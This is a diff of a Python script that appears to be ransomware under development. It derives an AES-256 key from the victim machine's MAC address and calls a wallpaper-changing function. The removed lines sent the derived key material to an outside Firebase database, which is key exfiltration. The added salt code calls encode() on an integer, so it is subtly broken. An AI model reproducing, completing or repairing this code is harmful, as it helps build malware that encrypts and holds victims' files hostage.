@@ -7,8 +7,6 @@ import struct
 import hashlib
 import ctypes
 from uuid import getnode as get_mac
-from firebase import firebase
-import multiprocessing
 
 IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
 KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
@@ -56,21 +54,20 @@ def change_bg():
 
 testPath = 'C:/Users/tmdgh/Desktop/test124/'
 
-multiprocessing.freeze_support()
 mac = get_mac()
+
+salt2 = mac
+salt2 = (salt2 * 5 * 2 + 7) % 1000000
+salt2 = salt2.encode()
+
 password2 = str(mac)
 password = password2.encode()
 
 salt = os.urandom(SALT_SIZE)
 
-base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY_SIZE)
+base = hashlib.pbkdf2_hmac('sha256', password, salt2, 100000, dklen=IV_SIZE + KEY_SIZE)
 iv = base[0:IV_SIZE]
 key = base[IV_SIZE:]
-
-base2 = base.decode('latin-1')
-
-firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
-result = firebase.post('/user' + '/' + password2, {"Base" : base2})
 
 change_bg()
 
